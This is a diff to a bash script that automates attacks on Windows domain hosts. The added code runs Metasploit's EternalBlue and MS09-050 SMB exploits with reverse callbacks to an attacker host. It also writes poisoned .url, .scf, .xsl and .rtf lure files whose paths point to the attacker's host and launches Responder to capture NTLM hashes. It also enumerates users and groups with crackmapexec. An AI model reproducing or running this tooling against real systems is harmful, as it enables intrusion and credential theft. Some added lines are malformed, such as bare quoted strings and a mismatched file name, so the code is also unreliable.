@@ -361,6 +361,9 @@ if [ $answer == 2 ]; then
 	CRACKLDAP="crackmapexec ldap $DOMAINIP -u $USER -p $PASS "
 	IMP="Impacket.txt"
 	I=impacket
+	MSF="msfconsole -x "
+	ETERNAL="use exploit/windows/smb/ms17_010_eternalblue; set LHOST $LHOST;set RHOSTS $DOMAINIP; set LPORT $LPORT; exploit"
+	MS09="use exploit/windows/smb/ms09_050_smb2_negotiate_func_index; set LHOST $LHOST;set RHOSTS $DOMAINIP; set LPORT $LPORT; exploit"
 
 	$R"Attacking System"; $RE
 	if [ -z "${DOMAINIP}" ] || [ -z "${DOMAIN}" ]; then
@@ -418,7 +421,32 @@ if [ $answer == 2 ]; then
 		$CRACKLDAP --admin-count >> $IMP
 		$CRACKLDAP --users >> $IMP
 		$CRACKLDAP --groups >> $IMP
+	fi
 
+	if [ $answer == 2 ]; then
+		$R"INT for responder (ex: eth0 or tun0)"
+		read INT
+		$RE
+		echo "[InternetShortcut]
+URL=whatever
+WorkingDirectory=whatever
+IconFile=\\\\$LHOST\\%USERNAME%.icon
+IconIndex=1" > @evil.url
+		echo "[Shell]
+Command=2
+IconFile=\\\\$LHOST\\tools\\nc.ico
+[Taskbar]
+Command=ToggleDesktop" > @evil.scf
+		echo "<?xml version='1.0' encoding='UTF-8' standalone='yes'?>
+<?mso-application progid='Word.Document'?>
+<?xml-stylesheet type='text/xsl' href='\\\\$LHOST\\bad.xsl' ?>" > @bad.xsl
+		echo "{\\rtf1{\\field{\\*\\fldinst {INCLUDEPICTURE "file://$LHOST/test.jpg" \\\\* MERGEFORMAT\\\\d}}{\fldrslt}}}" > test.rtf
+		$R"Upload @evil.scf to Remote Share"
+		"Upload @bad.xml to Remote Share"
+		"Upload @test.rtf to Remote Share"
+		"Upload @evil.url to Remote Share"; $RE
+		terminator --new-tab -e "sudo responder -I $INT -wv"
+	fi
 
 	if grep "CVE:CVE-2017-0143" $DOMAINIP.txt; then
 		$R""; $RE
@@ -428,7 +456,28 @@ if [ $answer == 2 ]; then
 		$R"Most likley vulnerable to MS09-050, can explot if Attack is used"; $RE
 		sleep 10
 	fi
+
+	if [ $answer == 3 ]; then
+		nmap -p 445 --script=smb-vuln* -Pn >> $DOMAINIP.txt
+		if grep "CVE:CVE-2017-0143" $DOMAINIP.txt; then
+			$MSF$ETERNAL
+		elif grep "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103" $DOMAINIP.txt; then
+			$MSF$MS09
+		else
+			$R"Looks like we cannot get easy wins"; $RE
+		fi
+	fi
+
 	if [ $answer == A ]; then
+		$Y"Lean with it, rock with it
+		When we gonna stop with it?
+		Lyrics that mean nothing
+		We were gifted with thought
+		
+		Is it time to move our feet
+		To an introspective beat
+		It ain't the speakers that bump hard
+		It's our hearts that make the beat"; $RE
 
 
 ###################################### LEAVE CRACK MAP EXEC AT THE BOTTOM OR IT WILL MESS WITH STUFF ##################################################################
@@ -437,6 +486,40 @@ if [ $answer == 2 ]; then
 		if [ $? != 0 ]; then
 			touch impacket.txt
 		fi
+
+		$R"INT for responder (ex: eth0 or tun0)"
+		read INT
+		$RE
+		echo "[InternetShortcut]
+URL=whatever
+WorkingDirectory=whatever
+IconFile=\\\\$LHOST\\%USERNAME%.icon
+IconIndex=1" > @evil.url
+		echo "[Shell]
+Command=2
+IconFile=\\\\$LHOST\\tools\\nc.ico
+[Taskbar]
+Command=ToggleDesktop" > @evil.scf
+		echo "<?xml version='1.0' encoding='UTF-8' standalone='yes'?>
+<?mso-application progid='Word.Document'?>
+<?xml-stylesheet type='text/xsl' href='\\\\$LHOST\\bad.xsl' ?>" > @bad.xsl
+		echo "{\\rtf1{\\field{\\*\\fldinst {INCLUDEPICTURE "file://$LHOST/test.jpg" \\\\* MERGEFORMAT\\\\d}}{\fldrslt}}}" > test.rtf
+		$R"Upload @evil.scf to Remote Share"
+		"Upload @bad.xml to Remote Share"
+		"Upload @test.rtf to Remote Share"
+		"Upload @evil.url to Remote Share"; $RE
+		terminator --new-tab -e "sudo responder -I $INT -wv"
+
+		nmap -p 445 --script=smb-vuln* -Pn >> $DOMAINIP.txt
+		if grep "CVE:CVE-2017-0143" $DOMAINIP.txt; then
+			$MSF$ETERNAL
+		elif grep "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103" $DOMAINIP.txt; then
+			$MSF$MS09
+		else
+			$R"Looks like we cannot get easy wins in Eternal Blue or MS09"; $RE
+		fi
+
+
 		$CRACKSMB --shares >> $IMP
 		$CRACKSMB --sessions >> $IMP
 		$CRACKSMB --disks >> $IMP
@@ -454,3 +537,5 @@ if [ $answer == 2 ]; then
 		$CRACKLDAP --admin-count >> $IMP
 		$CRACKLDAP --users >> $IMP
 		$CRACKLDAP --groups >> $IMP
+	fi
+fi
